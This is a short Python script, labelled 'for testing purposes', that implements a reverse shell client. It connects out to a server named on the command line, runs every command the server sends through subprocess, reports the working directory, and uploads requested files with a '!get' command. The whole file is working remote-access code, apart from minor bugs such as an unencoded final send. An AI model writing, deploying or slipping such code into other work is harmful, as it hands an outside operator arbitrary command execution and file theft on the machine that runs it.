#
# Used for testing purposes
#

import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[-1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 4
SEPARATOR = "<sep>"

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    print('Waiting...') # Debug
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    elif splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
            cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        else:
            output = ""
            cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
    elif splited_command[0] == "!get": # Being worked on
        file_socket = s.dup()
        filename = splited_command[1]
        filesize = os.path.getsize(filename)
        file_socket.send(f"{filename}{SEPARATOR}{filesize}".encode())
        with open(filename, "rb") as f:
            for line in f:
                file_socket.send(line)
            f.close()
            file_socket.close()
        print('Module done.') # Debug
    else:
        output = subprocess.getoutput(command)
        cwd = os.getcwd()
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message)
    print('Command completed.') # Debug
s.close()